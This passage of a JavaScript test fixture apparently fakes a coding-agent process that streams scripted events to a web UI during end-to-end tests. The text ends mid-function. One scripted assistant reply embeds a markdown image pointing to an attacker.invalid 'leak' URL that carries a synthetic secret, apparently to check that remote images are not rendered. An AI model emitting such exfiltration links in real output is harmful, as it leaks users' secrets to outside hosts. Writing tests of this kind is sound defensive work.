import fs from "node:fs";
import os from "node:os";
import path from "node:path";

if (process.argv.includes("--version")) {
	process.stdout.write("0.84.2\n");
	process.exit(0);
}

let inputBuffer = "";
let entrySequence = 0;
let activeRun = null;

function argument(name) {
	const index = process.argv.indexOf(name);
	return index >= 0 ? process.argv[index + 1] : undefined;
}

const requestedFile = argument("--session");
const requestedId = argument("--session-id");
const requestedDir = argument("--session-dir");
const markerPath = process.env.PI_WEB_E2E_MARKER;
const controlDir = process.env.PI_WEB_E2E_CONTROL_DIR;
const slowDelayMs = positiveNumber(process.env.PI_WEB_E2E_SLOW_DELAY_MS, 5_000);
const existingStateDelayMs = positiveNumber(process.env.PI_WEB_E2E_EXISTING_STATE_DELAY_MS, 0);
const deferNewSessionFileAfterStarts = positiveNumber(
	process.env.PI_WEB_E2E_DEFER_NEW_SESSION_FILE_AFTER_STARTS,
	Number.POSITIVE_INFINITY,
);
const deferNewSessionFile =
	!requestedFile &&
	(process.env.PI_WEB_E2E_DEFER_NEW_SESSION_FILE === "1" ||
		countRecordedStarts(markerPath) >= deferNewSessionFileAfterStarts);
const recoveryFeatures = process.env.PI_WEB_E2E_RECOVERY_FEATURES === "1";
let delayedExistingState = false;

let sessionId = requestedId ?? `browser-e2e-${String(process.pid)}`;
let sessionFile = requestedFile ? path.resolve(requestedFile) : "";
if (requestedFile) {
	const header = JSON.parse(fs.readFileSync(sessionFile, "utf8").split("\n", 1)[0]);
	sessionId = header.id;
} else {
	const sessionRoot = requestedDir ?? process.env.PI_CODING_AGENT_SESSION_DIR ?? os.tmpdir();
	sessionFile = path.join(path.resolve(sessionRoot), `2026-01-01T00-00-00-000Z_${sessionId}.jsonl`);
}

fs.mkdirSync(path.dirname(sessionFile), { recursive: true });
if (!deferNewSessionFile) ensureSessionFile();

const messages = fs.existsSync(sessionFile) ? loadMessages(sessionFile) : [];
const models = recoveryFeatures
	? Array.from({ length: 24 }, (_, index) => ({
			id: `deterministic-${String(index + 1).padStart(2, "0")}`,
			name: `Deterministic Model ${String(index + 1).padStart(2, "0")}`,
			provider: index < 12 ? "e2e-primary" : "e2e-secondary",
			reasoning: true,
			contextWindow: 128_000,
			cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, total: 0 },
		}))
	: [];
let currentModel = models[0];
let thinkingLevel = recoveryFeatures ? "medium" : "off";
record("started", { pid: process.pid, sessionId, sessionFile, cwd: process.cwd() });
if (deferNewSessionFile && process.env.PI_WEB_E2E_AUTOSTART_UNPERSISTED_HOT === "1") {
	setTimeout(() => startUnpersistedHotRuntime(), 25);
}

process.on("SIGTERM", () => {
	record("terminated", { pid: process.pid, sessionId });
	process.exit(0);
});

process.stdin.setEncoding("utf8");
process.stdin.on("data", (chunk) => {
	inputBuffer += chunk;
	for (;;) {
		const newline = inputBuffer.indexOf("\n");
		if (newline === -1) return;
		const line = inputBuffer.slice(0, newline);
		inputBuffer = inputBuffer.slice(newline + 1);
		if (line) handleLine(line);
	}
});

function positiveNumber(value, fallback) {
	const parsed = Number(value);
	return Number.isFinite(parsed) && parsed >= 0 ? parsed : fallback;
}

function countRecordedStarts(file) {
	if (!file || !fs.existsSync(file)) return 0;
	let count = 0;
	for (const line of fs.readFileSync(file, "utf8").split("\n")) {
		if (!line) continue;
		try {
			if (JSON.parse(line)?.type === "started") count += 1;
		} catch {
			// Another fixture process may still be appending the final marker line.
		}
	}
	return count;
}

function ensureSessionFile() {
	if (fs.existsSync(sessionFile)) return;
	fs.writeFileSync(
		sessionFile,
		`${JSON.stringify({
			type: "session",
			version: 3,
			id: sessionId,
			timestamp: "2026-01-01T00:00:00.000Z",
			cwd: process.cwd(),
		})}\n`,
		"utf8",
	);
}

function record(type, detail = {}) {
	if (!markerPath) return;
	fs.appendFileSync(
		markerPath,
		`${JSON.stringify({ type, at: Date.now(), pid: process.pid, sessionId, ...detail })}\n`,
		"utf8",
	);
}

function loadMessages(file) {
	const loaded = [];
	for (const line of fs.readFileSync(file, "utf8").split("\n").slice(1)) {
		if (!line) continue;
		try {
			const entry = JSON.parse(line);
			if (entry?.type === "message" && entry.message) loaded.push(entry.message);
		} catch {
			// A malformed historical line is irrelevant to this deterministic fixture.
		}
	}
	return loaded;
}

function forkMessages() {
	if (!fs.existsSync(sessionFile)) return [];
	const candidates = [];
	for (const line of fs.readFileSync(sessionFile, "utf8").split("\n").slice(1)) {
		if (!line) continue;
		try {
			const entry = JSON.parse(line);
			if (entry?.type !== "message" || entry.message?.role !== "user") continue;
			const content = entry.message.content;
			const text =
				typeof content === "string"
					? content
					: Array.isArray(content)
						? content
								.filter((block) => block?.type === "text" && typeof block.text === "string")
								.map((block) => block.text)
								.join("\n")
						: "";
			candidates.push({ entryId: entry.id, text });
		} catch {
			// Match Pi's best-effort picker behavior for malformed historical lines.
		}
	}
	return candidates;
}

function forkSession(command) {
	const parentSessionId = sessionId;
	sessionId = `${parentSessionId}-fork`;
	sessionFile = path.join(path.dirname(sessionFile), `2026-01-02T00-00-00-000Z_${sessionId}.jsonl`);
	// A root-message Pi fork has an allocated identity but intentionally no JSONL
	// until the next durable entry. The gateway must accept this pending identity.
	record("forked", { commandId: command.id, parentSessionId, sessionFile });
	respond(command, { text: "forked", cancelled: false });
}

function nextEntryId(role) {
	entrySequence += 1;
	return `${sessionId}-${role}-${String(Date.now())}-${String(entrySequence)}`;
}

function persistMessage(message, parentId) {
	ensureSessionFile();
	const id = nextEntryId(message.role);
	fs.appendFileSync(
		sessionFile,
		`${JSON.stringify({
			type: "message",
			id,
			parentId,
			timestamp: new Date(message.timestamp).toISOString(),
			message,
		})}\n`,
		"utf8",
	);
	return id;
}

function send(frame) {
	process.stdout.write(`${JSON.stringify(frame)}\n`);
}

function respond(command, data) {
	send({
		type: "response",
		id: command.id,
		command: command.type,
		success: true,
		...(data === undefined ? {} : { data }),
	});
}

function usageFor(output = 1) {
	return {
		input: 1,
		output,
		cacheRead: 0,
		cacheWrite: 0,
		totalTokens: 1 + output,
		cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, total: 0 },
	};
}

function assistantMessageWithContent(content, stopReason = "stop", timestamp = Date.now()) {
	const outputText = content
		.map((block) =>
			block.type === "text"
				? block.text
				: block.type === "thinking"
					? block.thinking
					: JSON.stringify(block.arguments ?? {}),
		)
		.join("");
	return {
		role: "assistant",
		content,
		api: "openai-completions",
		provider: "e2e",
		model: "deterministic",
		usage: usageFor(Math.max(1, Math.ceil(outputText.length / 4))),
		stopReason,
		timestamp,
	};
}

function assistantMessage(text, timestamp = Date.now()) {
	return assistantMessageWithContent([{ type: "text", text }], "stop", timestamp);
}

function toolResultMessage(
	toolCallId,
	details,
	timestamp = Date.now(),
	toolName = "edit",
	text = "\u001b[32mSynthetic edit completed\u001b[0m",
) {
	return {
		role: "toolResult",
		toolCallId,
		toolName,
		content: [{ type: "text", text }],
		details,
		isError: false,
		timestamp,
	};
}

function clearRunTimers(run) {
	for (const timer of run.timers) clearTimeout(timer);
	run.timers.length = 0;
}

function schedule(run, delay, callback) {
	const timer = setTimeout(() => {
		run.timers = run.timers.filter((candidate) => candidate !== timer);
		if (activeRun !== run) return;
		callback();
	}, delay);
	run.timers.push(timer);
}

function scheduleSlowFinish(run, text, callback) {
	if (!controlDir) {
		schedule(run, slowDelayMs, callback);
		return;
	}
	const releaseFile = path.join(controlDir, `${encodeURIComponent(text)}.release`);
	const check = () => {
		schedule(run, 25, () => {
			if (!fs.existsSync(releaseFile)) {
				check();
				return;
			}
			record("release_observed", { commandId: run.command.id, text });
			callback();
		});
	};
	check();
}

function scheduleConsumedRelease(run, text, eventType, callback) {
	if (!controlDir) {
		schedule(run, slowDelayMs, callback);
		return;
	}
	const releaseFile = path.join(controlDir, `${encodeURIComponent(text)}.release`);
	const check = () => {
		schedule(run, 25, () => {
			if (!fs.existsSync(releaseFile)) {
				check();
				return;
			}
			fs.unlinkSync(releaseFile);
			record(eventType, { commandId: run.command.id, text });
			callback();
		});
	};
	check();
}

function streamComplexPrompt(command, text, user, userEntryId) {
	const thinking =
		"\u001b[36mInspecting synthetic workspace\u001b[0m\nComparing the implementation with the requested behavior.";
	const toolCallId = `${sessionId}-complex-edit`;
	const toolArgs = {
		file_path: "src/demo.ts",
		description: "Normalize status labels",
	};
	const toolCall = { type: "toolCall", id: toolCallId, name: "edit", arguments: toolArgs };
	const diff = [
		"--- a/src/demo.ts",
		"+++ b/src/demo.ts",
		"@@ -1,3 +1,3 @@",
		" export function formatStatus(status: string) {",
		"-  return status;",
		"+  return status.toUpperCase();",
		" }",
	].join("\n");
	const markdown = [
		"## Synthetic change review",
		"",
		"The deterministic fixture exercised a complete coding-agent turn.",
		"",
		"- Preserve the public API",
		"- Normalize the displayed status",
		"- Keep the change isolated",
		"",
		"| Check | Result |",
		"| --- | --- |",
		"| Protocol sequence | Verified |",
		"| Sensitive data | None |",
		"",
		"```ts",
		"export function formatStatus(status: string) {",
		"  return status.toUpperCase();",
		"}",
		"```",
		"",
		"![Remote evidence](https://attacker.invalid/leak?secret=SYNTHETIC_TOKEN)",
		"",
		"The synthetic edit is settled and ready for review.",
	].join("\n");

	const run = { command, label: "complex-demo", timers: [], assembled: "", userEntryId };
	activeRun = run;
	record("prompt", {
		commandId: command.id,
		text,
		imageCount: 0,
		imageMimeTypes: [],
		imageChars: 0,
		slow: false,
		complex: true,
	});

	send({ type: "agent_start" });
	send({ type: "turn_start" });
	send({ type: "message_start", message: user });
	send({ type: "message_end", message: user });
	send({ type: "session_info_changed" });
	send({ type: "message_start", message: assistantMessageWithContent([], "pending") });
	respond(command);

	schedule(run, 25, () => {
		let partial = assistantMessageWithContent([], "pending");
		send({
			type: "message_update",
			usage: partial.usage,
			assistantMessageEvent: { type: "thinking_start", contentIndex: 0 },
		});
		partial = assistantMessageWithContent([{ type: "thinking", thinking }], "pending");
		send({
			type: "message_update",
			usage: partial.usage,
			assistantMessageEvent: { type: "thinking_delta", contentIndex: 0, delta: thinking },
		});
		send({
			type: "message_update",
			usage: partial.usage,
			assistantMessageEvent: { type: "thinking_end", contentIndex: 0, content: thinking },
		});
		send({
			type: "message_update",
			usage: partial.usage,
			assistantMessageEvent: { type: "toolcall_start", contentIndex: 1 },
		});
		const toolArgsText = JSON.stringify(toolArgs);
		send({
			type: "message_update",
			usage: partial.usage,
			assistantMessageEvent: {
				type: "toolcall_delta",
				contentIndex: 1,
				delta: toolArgsText,
			},
		});
		const toolUse = assistantMessageWithContent([{ type: "thinking", thinking }, toolCall], "toolUse");
		send({
			type: "message_update",
			usage: toolUse.usage,
			assistantMessageEvent: { type: "toolcall_end", contentIndex: 1, toolCall },
		});
		send({ type: "message_end", message: toolUse });
		messages.push(toolUse);
		const toolUseEntryId = persistMessage(toolUse, userEntryId);

		send({ type: "tool_execution_start", toolCallId, toolName: "edit", args: toolArgs });
		send({
			type: "tool_execution_update",
			toolCallId,
			toolName: "edit",
			args: toolArgs,
			partialResult: { text: "Preparing synthetic diff" },
		});
		const result = { content: "Synthetic edit completed", details: { diff } };
		send({
			type: "tool_execution_end",
			toolCallId,
			toolName: "edit",
			result,
			isError: false,
		});
		const toolResult = toolResultMessage(toolCallId, { diff });
		send({ type: "message_start", message: toolResult });
		send({ type: "message_end", message: toolResult });
		messages.push(toolResult);
		const toolResultEntryId = persistMessage(toolResult, toolUseEntryId);

		const emptyFinal = assistantMessageWithContent([], "pending");
		send({ type: "message_start", message: emptyFinal });
		send({
			type: "message_update",
			usage: emptyFinal.usage,
			assistantMessageEvent: { type: "text_start", contentIndex: 0 },
		});
		const final = assistantMessageWithContent([{ type: "text", text: markdown }], "stop");
		send({
			type: "message_update",
			usage: final.usage,
			assistantMessageEvent: { type: "text_delta", contentIndex: 0, delta: markdown },
		});
		send({
			type: "message_update",
			usage: final.usage,
			assistantMessageEvent: { type: "text_end", contentIndex: 0, content: markdown },
		});
		send({ type: "message_end", message: final });
		send({ type: "turn_end", message: final, toolResults: [toolResult] });
		messages.push(final);
		persistMessage(final, toolResultEntryId);
		send({ type: "agent_end", messages: [user, toolUse, toolResult, final], willRetry: false });
		send({ type: "agent_settled" });
		record("settled", { commandId: command.id, text, label: "complex-demo" });
		activeRun = null;
	});
}

function streamInspectPrompt(command, text, user, userEntryId) {
	const toolCallId = `${sessionId}-inspect-bash`;
	const toolArgs = {
		command: "printf 'E2E_BASH_COMMAND' && pwd",
		timeout: 120,
		env: { E2E_MODE: "inspect" },
	};
	const toolCall = { type: "toolCall", id: toolCallId, name: "bash", arguments: toolArgs };
	const run = { command, label: "inspect-surfaces", timers: [], assembled: "", userEntryId };
	activeRun = run;
	record("prompt", {
		commandId: command.id,
		text,
		imageCount: 0,
		imageMimeTypes: [],
		imageChars: 0,
		slow: false,
		inspect: true,
	});

	send({ type: "agent_start" });
	send({ type: "turn_start" });
	send({ type: "message_start", message: user });
	send({ type: "message_end", message: user });
	send({ type: "session_info_changed" });
	const pending = assistantMessageWithContent([], "pending");
	send({ type: "message_start", message: pending });
	respond(command);

	schedule(run, 25, () => {
		send({
			type: "message_update",
			usage: pending.usage,
			assistantMessageEvent: { type: "toolcall_start", contentIndex: 0 },
		});
		send({
			type: "message_update",
			usage: pending.usage,
			assistantMessageEvent: {
				type: "toolcall_delta",
				contentIndex: 0,
				delta: JSON.stringify(toolArgs),
			},
		});
		const toolUse = assistantMessageWithContent([toolCall], "toolUse");
		send({
			type: "message_update",
			usage: toolUse.usage,
			assistantMessageEvent: { type: "toolcall_end", contentIndex: 0, toolCall },
		});
		send({ type: "message_end", message: toolUse });
		messages.push(toolUse);
		const toolUseEntryId = persistMessage(toolUse, userEntryId);

		send({ type: "tool_execution_start", toolCallId, toolName: "bash", args: toolArgs });
		send({
			type: "tool_execution_update",
			toolCallId,
			toolName: "bash",
			args: toolArgs,
			partialResult: { text: "E2E_BASH_COMMAND" },
		});
		const output = "E2E_BASH_OUTPUT\n/synthetic/workspace";
		send({
			type: "tool_execution_end",
			toolCallId,
			toolName: "bash",
			result: { content: output, details: { exitCode: 0, durationMs: 12 } },
			isError: false,
		});
		const toolResult = toolResultMessage(
			toolCallId,
			{ exitCode: 0, durationMs: 12 },
			Date.now(),
			"bash",
			output,
		);
		send({ type: "message_start", message: toolResult });
		send({ type: "message_end", message: toolResult });
		messages.push(toolResult);
		const resultEntryId = persistMessage(toolResult, toolUseEntryId);

		const final = assistantMessage("E2E_INSPECT_COMPLETE");
		send({ type: "message_start", message: final });
		send({ type: "message_end", message: final });
		send({ type: "turn_end", message: final, toolResults: [toolResult] });
		messages.push(final);
		persistMessage(final, resultEntryId);
		send({ type: "agent_end", messages: [user, toolUse, toolResult, final], willRetry: false });
		send({ type: "agent_settled" });
		record("settled", { commandId: command.id, text, label: "inspect-surfaces" });
		activeRun = null;
	});
}

function conversationTree() {
	const rootMessage = messages.find((message) => message.role === "user") ?? {
		role: "user",
		content: [{ type: "text", text: "E2E historical request" }],
		timestamp: Date.now(),
	};
	const alternative = assistantMessage("Earlier alternative");
	const current = assistantMessage("Current active reply");
	const timestamp = "2026-01-01T00:00:00.000Z";
	return {
		tree: [
			{
				entry: {
					type: "message",
					id: "tree-user",
					parentId: null,
					timestamp,
					message: rootMessage,
				},
				label: "Root request",
				children: [
					{
						entry: {
							type: "message",
							id: "tree-alternative",
							parentId: "tree-user",
							timestamp,
							message: alternative,
						},
						label: "Earlier alternative",
						children: [],
					},
					{
						entry: {
							type: "message",
							id: "tree-current",
							parentId: "tree-user",
							timestamp,
							message: current,
						},
						label: "Current active reply",
						children: [],
					},
				],
			},
		],
		leafId: "tree-current",
	};
}

function stressTool(index) {
	const ordinal = String(index).padStart(3, "0");
	const toolName = ["read", "grep", "bash", "edit"][index % 4];
	const sentinel = `synthetic-tool-${ordinal}`;
	if (toolName === "read") {
		return {
			toolName,
			args: { file_path: `src/${sentinel}.ts` },
			details: { lines: 12, synthetic: true },
		};
	}
	if (toolName === "grep") {
		return {
			toolName,
			args: { pattern: sentinel, path: "src" },
			details: { matches: 1, synthetic: true },
		};
	}
	if (toolName === "bash") {
		return {
			toolName,
			args: { command: `printf '${sentinel}'` },
			details: { exitCode: 0, synthetic: true },
		};
	}
	const diff = [
		`--- a/src/${sentinel}.ts`,
		`+++ b/src/${sentinel}.ts`,
		"@@ -1 +1 @@",
		`-export const value = "before-${ordinal}";`,
		`+export const value = "after-${ordinal}";`,
	].join("\n");
	return {
		toolName,
		args: { file_path: `src/${sentinel}.ts`, description: sentinel },
		details: { diff, synthetic: true },
	};
}

function emitStressTool(run, index) {
	const ordinal = String(index).padStart(3, "0");
	const { toolName, args, details } = stressTool(index);
	const toolCallId = `${sessionId}-stress-${ordinal}`;
	const toolCall = { type: "toolCall", id: toolCallId, name: toolName, arguments: args };
	let partial = assistantMessageWithContent([], "pending");
	send({ type: "message_start", message: partial });
	send({
		type: "message_update",
		usage: partial.usage,
		assistantMessageEvent: { type: "toolcall_start", contentIndex: 0 },
	});
	send({
		type: "message_update",
		usage: partial.usage,
		assistantMessageEvent: {
			type: "toolcall_delta",
			contentIndex: 0,
			delta: JSON.stringify(args),
		},
	});
	partial = assistantMessageWithContent([toolCall], "toolUse");
	send({
		type: "message_update",
		usage: partial.usage,
		assistantMessageEvent: { type: "toolcall_end", contentIndex: 0, toolCall },
	});
	send({ type: "message_end", message: partial });
	messages.push(partial);
	run.agentMessages.push(partial);
	run.parentEntryId = persistMessage(partial, run.parentEntryId);

	send({ type: "tool_execution_start", toolCallId, toolName, args });
	send({
		type: "tool_execution_update",
		toolCallId,
		toolName,
		args,
		partialResult: { text: `Synthetic progress ${ordinal}` },
	});
	const content = `Synthetic result ${ordinal}`;
	send({
		type: "tool_execution_end",
		toolCallId,
		toolName,
		result: { content, details },
		isError: false,
	});
	const toolResult = toolResultMessage(toolCallId, details, Date.now(), toolName, content);
	send({ type: "message_start", message: toolResult });
	send({ type: "message_end", message: toolResult });
	messages.push(toolResult);
	run.agentMessages.push(toolResult);
	run.toolResults.push(toolResult);
	run.parentEntryId = persistMessage(toolResult, run.parentEntryId);
}

function stressMarkdown() {
	let code = "";
	for (let index = 0; code.length < 70 * 1024; index += 1) {
		const ordinal = String(index).padStart(4, "0");
		code += `export const synthetic_line_${ordinal} = "deterministic-${ordinal}";\n`;
	}
	return [
		"## Synthetic stress trajectory",
		"",
		"The packaged workbench projected a deliberately large, deterministic coding-agent trajectory.",
		"",
		"| Check | Result |",
		"| --- | --- |",
		"| Tool sequence | 52 mixed calls |",
		"| Provider traffic | None |",
		"| Payload source | Synthetic fixture |",
		"",
		"```ts",
		code,
		"// STRESS_CODE_END",
		"```",
		"",
		"The long settled response is complete.",
	].join("\n");
}

function streamStressPrompt(command, text, user, userEntryId) {
	const run = {
		kind: "stress",
		command,
		label: "stress-trajectory",
		timers: [],
		assembled: "",
		userEntryId,
		parentEntryId: userEntryId,
		agentMessages: [user],
		toolResults: [],
	};
	activeRun = run;
	record("prompt", {
		commandId: command.id,
		text,
		imageCount: 0,
		imageMimeTypes: [],
		imageChars: 0,
		slow: true,
		stress: true,
	});

	send({ type: "agent_start" });
	send({ type: "turn_start" });
	send({ type: "message_start", message: user });
	send({ type: "message_end", message: user });
	send({ type: "session_info_changed" });
	respond(command);

	schedule(run, 25, () => {
		for (let index = 0; index < 26; index += 1) emitStressTool(run, index);
		record("stress_checkpoint", { commandId: command.id, text, toolCount: 26 });
		scheduleSlowFinish(run, text, () => {
			for (let index = 26; index < 52; index += 1) emitStressTool(run, index);
			const markdown = stressMarkdown();
			const pending = assistantMessageWithContent([], "pending");
			send({ type: "message_start", message: pending });
			send({
				type: "message_update",
				usage: pending.usage,
				assistantMessageEvent: { type: "text_start", contentIndex: 0 },
			});
			const final = assistantMessageWithContent([{ type: "text", text: markdown }], "stop");
			send({
				type: "message_update",
				usage: final.usage,
				assistantMessageEvent: { type: "text_delta", contentIndex: 0, delta: markdown },
			});
			send({
				type: "message_update",
				usage: final.usage,
				assistantMessageEvent: { type: "text_end", contentIndex: 0, content: markdown },
			});
			send({ type: "message_end", message: final });
			send({ type: "turn_end", message: final, toolResults: run.toolResults });
			messages.push(final);
			run.agentMessages.push(final);
			persistMessage(final, run.parentEntryId);
			send({ type: "agent_end", messages: run.agentMessages, willRetry: false });
			send({ type: "agent_settled" });
			record("settled", {
				commandId: command.id,
				text,
				label: "stress-trajectory",
				toolCount: 52,
				markdownChars: markdown.length,
			});
			activeRun = null;
		});
	});
}

function startUnpersistedHotRuntime() {
	if (activeRun) return;
	const run = {
		kind: "unpersisted-hot",
		label: "unpersisted-hot",
		timers: [],
		assembled: "",
	};
	activeRun = run;
	send({ type: "agent_start" });
	send({ type: "turn_start" });
	const pending = assistantMessageWithContent([], "pending");
	send({ type: "message_start", message: pending });
	const partialText = `E2E_UNPERSISTED_PARTIAL:${sessionId}`;
	send({
		type: "message_update",
		usage: pending.usage,
		assistantMessageEvent: { type: "text_start", contentIndex: 0 },
	});
	send({
		type: "message_update",
		usage: pending.usage,
		assistantMessageEvent: { type: "text_delta", contentIndex: 0, delta: partialText },
	});
	record("unpersisted_hot_checkpoint", { text: sessionId, partialText });
}

function streamExtensionPrompt(command, text, user, userEntryId) {
	const requestId = `${sessionId}-synthetic-confirm`;
	const run = {
		kind: "extension",
		command,
		label: "extension-confirm",
		timers: [],
		assembled: "",
		user,
		userEntryId,
		requestId,
		text,
	};
	activeRun = run;
	record("prompt", {
		commandId: command.id,
		text,
		imageCount: 0,
		imageMimeTypes: [],
		imageChars: 0,
		slow: false,
		extension: true,
	});
	send({ type: "agent_start" });
	send({ type: "turn_start" });
	send({ type: "message_start", message: user });
	send({ type: "message_end", message: user });
	send({ type: "session_info_changed" });
	respond(command);
	schedule(run, 25, () => {
		send({
			type: "extension_ui_request",
			id: requestId,
			method: "confirm",
			title: "Synthetic approval",
			message: "Continue the synthetic run?",
		});
		record("extension_request", { commandId: command.id, text, requestId });
	});
}

function finishExtensionPrompt(response) {
	const run = activeRun;
	if (run?.kind === "reload-checkpoint" && response.id === run.requestId) {
		run.extensionResponse = response;
		record("extension_response", {
			commandId: run.command.id,
			text: run.text,
			confirmed: response.confirmed === true,
			cancelled: response.cancelled === true,
		});
		finishReloadCheckpointPrompt(run);
		return;
	}
	if (run?.kind !== "extension" || response.id !== run.requestId) return;
	const confirmed = response.confirmed === true;
	const cancelled = response.cancelled === true;
	record("extension_response", {
		commandId: run.command.id,
		text: run.text,
		confirmed,
		cancelled,
	});
	const label = confirmed ? "E2E_EXTENSION_CONFIRMED" : "E2E_EXTENSION_CANCELLED";
	const final = assistantMessage(label);
	send({ type: "message_start", message: final });
	send({ type: "message_end", message: final });
	send({ type: "turn_end", message: final, toolResults: [] });
	messages.push(final);
	persistMessage(final, run.userEntryId);
	send({ type: "agent_end", messages: [run.user, final], willRetry: false });
	send({ type: "agent_settled" });
	record("settled", { commandId: run.command.id, text: run.text, label });
	activeRun = null;
}

function finishReloadCheckpointPrompt(run) {
	if (activeRun !== run || !run.toolReleased || !run.extensionResponse) return;
	const confirmed = run.extensionResponse.confirmed === true;
	const toolOutput = confirmed ? "E2E_RELOAD_TOOL_COMPLETE" : "E2E_RELOAD_TOOL_CANCELLED";
	const toolDetails = { exitCode: confirmed ? 0 : 1, synthetic: true };
	send({
		type: "tool_execution_end",
		toolCallId: run.toolCallId,
		toolName: "bash",
		result: { content: toolOutput, details: toolDetails },
		isError: !confirmed,
	});
	const toolResult = {
		...toolResultMessage(run.toolCallId, toolDetails, Date.now(), "bash", toolOutput),
		isError: !confirmed,
	};
	send({ type: "message_start", message: toolResult });
	send({ type: "message_end", message: toolResult });
	messages.push(toolResult);
	const toolResultEntryId = persistMessage(toolResult, run.toolUseEntryId);

	const finalText = confirmed ? "E2E_RELOAD_SETTLED" : "E2E_RELOAD_CANCELLED";
	const final = assistantMessage(finalText);
	send({ type: "message_start", message: final });
	send({ type: "message_end", message: final });
	send({ type: "turn_end", message: final, toolResults: [toolResult] });
	messages.push(final);
	persistMessage(final, toolResultEntryId);
	send({ type: "agent_end", messages: [run.user, run.toolUse, toolResult, final], willRetry: false });
	send({ type: "agent_settled" });
	record("settled", { commandId: run.command.id, text: run.text, label: finalText });
	activeRun = null;
}

function enterReloadToolCheckpoint(run) {
	if (activeRun !== run || !run.textReleased) return;
	const partialText = "E2E_RELOAD_PARTIAL_TEXT";
	const toolPartial = "E2E_RELOAD_TOOL_PARTIAL";
	const toolArgs = { command: "printf 'E2E_RELOAD_TOOL'" };
	const toolCall = { type: "toolCall", id: run.toolCallId, name: "bash", arguments: toolArgs };
	send({
		type: "message_update",
		usage: run.pending.usage,
		assistantMessageEvent: { type: "text_end", contentIndex: 0, content: partialText },
	});
	send({
		type: "message_update",
		usage: run.pending.usage,
		assistantMessageEvent: { type: "toolcall_start", contentIndex: 1 },
	});
	send({
		type: "message_update",
		usage: run.pending.usage,
		assistantMessageEvent: {
			type: "toolcall_delta",
			contentIndex: 1,
			delta: JSON.stringify(toolArgs),
		},
	});
	const toolUse = assistantMessageWithContent([{ type: "text", text: partialText }, toolCall], "toolUse");
	send({
		type: "message_update",
		usage: toolUse.usage,
		assistantMessageEvent: { type: "toolcall_end", contentIndex: 1, toolCall },
	});
	send({ type: "message_end", message: toolUse });
	messages.push(toolUse);
	run.toolUse = toolUse;
	run.toolUseEntryId = persistMessage(toolUse, run.userEntryId);

	send({ type: "tool_execution_start", toolCallId: run.toolCallId, toolName: "bash", args: toolArgs });
	send({
		type: "tool_execution_update",
		toolCallId: run.toolCallId,
		toolName: "bash",
		args: toolArgs,
		partialResult: { text: toolPartial },
	});
	send({
		type: "extension_ui_request",
		id: run.requestId,
		method: "confirm",
		title: "Reload checkpoint approval",
		message: "Resume the held synthetic run?",
	});
	record("reload_tool_checkpoint", {
		commandId: run.command.id,
		text: run.text,
		partialText,
		toolCallId: run.toolCallId,
		toolPartial,
		requestId: run.requestId,
	});
	scheduleConsumedRelease(run, run.text, "reload_tool_released", () => {
		run.toolReleased = true;
		finishReloadCheckpointPrompt(run);
	});
}

function streamReloadCheckpointPrompt(command, text, user, userEntryId) {
	const partialText = "E2E_RELOAD_PARTIAL_TEXT";
	const toolCallId = `${sessionId}-reload-bash`;
	const requestId = `${sessionId}-reload-confirm`;
	const run = {
		kind: "reload-checkpoint",
		command,
		label: "reload-checkpoint",
		timers: [],
		assembled: partialText,
		user,
		userEntryId,
		toolCallId,
		requestId,
		text,
		toolUse: null,
		toolUseEntryId: null,
		pending: null,
		textReleased: false,
		toolReleased: false,
		extensionResponse: null,
	};
	activeRun = run;
	record("prompt", {
		commandId: command.id,
		text,
		imageCount: 0,
		imageMimeTypes: [],
		imageChars: 0,
		slow: true,
		reloadCheckpoint: true,
	});

	send({ type: "agent_start" });
	send({ type: "turn_start" });
	send({ type: "message_start", message: user });
	send({ type: "message_end", message: user });
	send({ type: "session_info_changed" });
	const pending = assistantMessageWithContent([], "pending");
	run.pending = pending;
	send({ type: "message_start", message: pending });
	respond(command);

	schedule(run, 25, () => {
		send({
			type: "message_update",
			usage: pending.usage,
			assistantMessageEvent: { type: "text_start", contentIndex: 0 },
		});
		send({
			type: "message_update",
			usage: pending.usage,
			assistantMessageEvent: { type: "text_delta", contentIndex: 0, delta: partialText },
		});
		record("reload_text_checkpoint", {
			commandId: command.id,
			text,
			partialText,
		});
		scheduleConsumedRelease(run, text, "reload_text_released", () => {
			run.textReleased = true;
			enterReloadToolCheckpoint(run);
		});
	});
}

function streamPrompt(command) {
	const text = typeof command.message === "string" ? command.message : "";
	const images = Array.isArray(command.images) ? command.images : [];
	const presentedText =
		recoveryFeatures && text.startsWith("/skill:e2e")
			? `<skill name="e2e" location="/synthetic/e2e/SKILL.md">\nSECRET_SKILL_BODY_MUST_NOT_RENDER\n</skill>${text.slice("/skill:e2e".length).trim() ? `\n\n${text.slice("/skill:e2e".length).trim()}` : ""}`
			: text;
	const userContent = [
		...(presentedText ? [{ type: "text", text: presentedText }] : []),
		...images.map((image) => ({ type: "image", data: image.data, mimeType: image.mimeType })),
	];
	const user = { role: "user", content: userContent, timestamp: Date.now() };
	const userEntryId = persistMessage(user, null);
	messages.push(user);
	if (text === "E2E_COMPLEX_DEMO" && images.length === 0) {
		streamComplexPrompt(command, text, user, userEntryId);
		return;
	}
	if (text === "E2E_RECOVERY_INSPECT" && images.length === 0) {
		streamInspectPrompt(command, text, user, userEntryId);
		return;
	}
	if (text === "E2E_STRESS_TRAJECTORY" && images.length === 0) {
		streamStressPrompt(command, text, user, userEntryId);
		return;
	}
	if (text === "E2E_EXTENSION_CONFIRM" && images.length === 0) {
		streamExtensionPrompt(command, text, user, userEntryId);
		return;
	}
	if (text === "E2E_RELOAD_ACTIVE_STATE" && images.length === 0) {
		streamReloadCheckpointPrompt(command, text, user, userEntryId);
		return;
	}

	const label =
		images.length > 0 && !text
			? `E2E_IMAGE_OK:${String(images.length)}:${images[0]?.mimeType ?? "unknown"}`
			: `E2E_REPLY:${text}`;
	const slow = text.includes("E2E_A_SLOW");
	const firstDelay = slow ? Math.min(500, Math.floor(slowDelayMs / 3)) : 25;
	const finishDelay = 90;
	const splitAt = Math.max(1, Math.floor(label.length / 2));
	const firstDelta = label.slice(0, splitAt);
	const finalDelta = label.slice(splitAt);

	const run = { command, label, timers: [], assembled: "", userEntryId };
	activeRun = run;
	record("prompt", {
		commandId: command.id,
		text,
		imageCount: images.length,
		imageMimeTypes: images.map((image) => image.mimeType),
		imageChars: images.reduce((total, image) => total + String(image.data).length, 0),
		slow,
	});

	send({ type: "agent_start" });
	send({ type: "turn_start" });
	send({ type: "message_start", message: user });
	send({ type: "message_end", message: user });
	send({ type: "session_info_changed" });
	send({ type: "message_start", message: assistantMessage("") });
	respond(command);

	schedule(run, firstDelay, () => {
